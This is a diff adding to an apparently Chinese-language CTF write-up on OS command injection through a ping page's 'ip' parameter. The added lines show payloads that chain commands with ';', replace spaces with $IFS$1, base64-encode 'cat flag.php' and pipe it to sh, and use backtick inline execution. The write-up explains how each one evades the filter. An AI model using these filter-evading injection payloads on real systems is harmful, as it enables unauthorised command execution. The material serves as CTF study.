@@ -200,3 +200,16 @@ PING 1 (0.0.0.1): 56 data bytes
 /?ip=1;a=ag;b=fl;cat$IFS$1$b$a.php
 ```
 
+2.sh命令
+```
+/?ip=1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
+```
+这里sh本来是bash，但bash被过滤用sh也行。它们都是shell，bash更好些，shell就是和系统交互的窗口，简单来说相当于编译器。|是管道符，意思为把|前的语句执行结果作为|后面的输入数据。Y2F0IGZsYWcucGhwbase64解码后就是cat flag.php。base64$IFS$1-d就是base64 -d,-d就是-decode解码。
+整句就是echo Y2F0IGZsYWcucGhw|base64 -d|sh
+
+3.内联执行
+```
+/?ip=1;cat$IFS$1`ls`
+```
+内联大概就是把反引号内执行后的内容作为我们的payload的一部分
+ls执行后第一行就是flag.php
